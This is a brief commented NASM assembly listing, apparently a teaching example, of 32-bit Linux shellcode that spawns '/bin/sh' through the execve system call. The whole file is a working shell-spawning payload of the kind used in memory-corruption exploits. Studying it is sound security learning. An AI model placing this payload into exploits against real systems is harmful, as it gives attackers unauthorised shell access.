; Compile with NASM: "nasm filename"
[BITS 32]			; 32 BIT code
	; Zero out the registers. 
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx

	push eax		; Push 0x0 to the stack
	push "n/sh"		; Push "//bin/sh" to the stack
	push "//bi"		; --

	; execve()  executes  the  program  pointed to by filename
	; int execve(const char *filename,char *const argv[],char *const envp[])
	mov al, 0x0b		; execve call code
	mov ebx, esp		; char* filename is located on the stack, esp
	int 0x80		; call kernel
